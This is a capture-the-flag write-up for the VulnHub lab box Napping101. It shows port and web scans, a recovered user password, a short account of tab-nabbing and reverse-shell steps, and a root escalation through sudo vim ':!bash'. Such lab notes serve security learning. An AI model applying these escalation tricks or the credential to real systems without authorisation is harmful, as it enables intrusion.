# BOX NAME: Napping101
**LINK**: https://vulnhub.com/entry/napping-101,752/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. So this was a simple box if the exploit wasn't patched in most browsers. Tab nabbing.
2. The privesc was pretty simple. Find a file owned by a certain group, manipulate it, get revshell as another user.
3. New user had sudo rights on application. 
4. Use a GTFO-bin. SCORE
5.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.157
[+] URL:	http://10.77.0.157
```
</details>
<details><summary><ins>PORTSCAN</ins></summary>

```
└─$ jml-scanner -u $IP 

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|J|M|L|-|P|O|R|T|S|C|A|N|N|E|R|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

[+] Port 22 is open.
[+] Port 80 is open.

[+] A total of 2 found ports open 
```

```
└─$ sudo nmap -sS -sV $IP -oN nmap-napping.log
[sudo] password for jml: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-15 20:16 CEST
Nmap scan report for 10.77.0.157
Host is up (0.0015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb -a3 -v $URL | tee whatweb-napping.log
WhatWeb report for http://10.77.0.157
Status    : 200 OK
Title     : Login
IP        : 10.77.0.157
Country   : RESERVED, ZZ
                                                                                                                                                                                                                                                                                                                          
Summary   : Apache[2.4.41], Bootstrap[4.5.2], Cookies[PHPSESSID], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], PasswordField[password]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and
        maintain an open-source HTTP server for modern operating
        systems including UNIX and Windows NT. The goal of this
        project is to provide a secure, efficient and extensible
        server that provides HTTP services in sync with the current
        HTTP standards.
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        Version      : 2.4.41 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/
[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with 
        HTML, CSS, and JS. 
        Version      : 4.5.2
        Website     : https://getbootstrap.com/
[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 
        String       : PHPSESSID
[ HTML5 ]
        HTML version 5, detected by the doctype declaration 
[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 
        OS           : Ubuntu Linux
        String       : Apache/2.4.41 (Ubuntu) (from server string)
[ PasswordField ]
        find password fields 
        String       : password (from field name)
HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 15 Sep 2023 18:18:01 GMT
        Server: Apache/2.4.41 (Ubuntu)
        Set-Cookie: PHPSESSID=qas7h49o69alhu6sj14lnrn5h3; path=/
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate
        Pragma: no-cache
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 536
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

nikto-scan
```
└─$ nikto -h $URL | tee nikto-napping.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.157
+ Target Hostname:    10.77.0.157
+ Target Port:        80
+ Start Time:         2023-09-15 20:26:24 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-09-15 20:26:49 (GMT2) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```

```
**SGID's**:

```

```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
[username:password]

daniel:C@ughtm3napping123
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
user.txt

adrian@napping:~$ cat user.txt
You are nearly there!
```

```
adrian@napping:~$ sudo -l
Matching Defaults entries for adrian on napping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on napping:
    (root) NOPASSWD: /usr/bin/vim

# vim
:!bash

```

```
root@napping:~# cat root.txt 
Admins just can't stay awake tsk tsk tsk
```

</details>